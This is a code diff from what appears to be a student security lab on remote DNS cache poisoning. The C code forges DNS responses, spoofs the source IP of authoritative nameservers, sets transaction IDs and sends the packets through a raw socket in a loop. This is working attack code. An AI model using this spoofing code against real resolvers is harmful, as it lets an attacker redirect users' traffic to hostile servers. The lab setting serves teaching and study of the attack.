@@ -75,7 +75,7 @@ int main()
                each one with a different transaction ID. */
     
     // ... Students should add code here.
-    for (int i = 0; i < 10000; i++)
+    for (int i = 0; i < 300; i++)
      {
         send_dns_response(ip_resp, n_resp,"199.43.135.53" , name ,transid);  
         send_dns_response(ip_resp, n_resp,"199.43.133.53" , name ,transid);  
@@ -103,10 +103,17 @@ void send_dns_request(unsigned char* ip_req, int n_req,char* name)
  * */
 void send_dns_response(unsigned char *ip_resp, int n_resp,unsigned char* src,  char* name ,unsigned short id)
 {
+  // change the ip address in offset 12
+   int ip = (int)inet_addr(src);
+  memcpy(ip_resp+12, (void*)&ip, 4);
+   
     // Modify the Transaction ID at offset 28 
-    unsigned short tx_id = rand() % 65536;
-    unsigned short tx_id_net_order = htons(tx_id);  // Convert to network byte order
-    memcpy(ip_resp + 28, &tx_id_net_order, 2);  // Modify the Transaction ID at offset 28
+    //unsigned short tx_id = rand() % 65536;
+    // unsigned short tx_id_net_order = htons(tx_id);  // Convert to network byte order
+    // memcpy(ip_resp + 28, &tx_id_net_order, 2);  // Modify the Transaction ID at offset 28
+
+    unsigned short transid = htons(id);
+    memcpy(ip_resp + 28, (void*)&transid, 2);  
 
     // Print the Transaction ID for tracking purposes
     // printf("Sending spoofed DNS response with transaction ID: %d...\n", tx_id);
@@ -117,8 +124,7 @@ void send_dns_response(unsigned char *ip_resp, int n_resp,unsigned char* src,  c
     memcpy(ip_resp + 41, name, 5);  // Modify the domain name in the Question section
     memcpy(ip_resp + 64, name, 5);  // Modify the domain name in the Answer section
 
-    unsigned short transid = htons(id);
-    memcpy(ip_resp + 28, (void*)&transid, 2);  
+     
 
     // Send the forged DNS response packet
     send_raw_packet(ip_resp, n_resp);
